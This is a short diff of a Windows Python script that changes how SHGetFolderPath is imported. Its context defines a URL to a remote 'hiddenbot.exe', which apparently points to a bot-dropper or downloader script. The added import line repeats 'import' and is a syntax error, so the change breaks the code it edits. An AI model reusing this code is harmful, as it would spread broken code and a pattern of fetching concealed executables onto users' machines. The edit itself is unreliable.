@@ -4,6 +4,7 @@ import win32api
 import win32con
 
 from win32com.shell import shellcon
+from win32com.shell.shell import import SHGetFolderPath
 
 global chatboturl
 CHATBOTURL = "http://192.168.2.4:8080/hiddenbot.exe"
@@ -37,7 +38,7 @@ def file_in_special_path(specialpath, fname):
     @param fname: the name of the file
     """
     from win32com.shell import shell
-    path = shell.SHGetFolderPath(0, specialpath, None, 0)
+    path = SHGetFolderPath(0, specialpath, None, 0)
     path = os.path.join(path, fname)
     return path
 
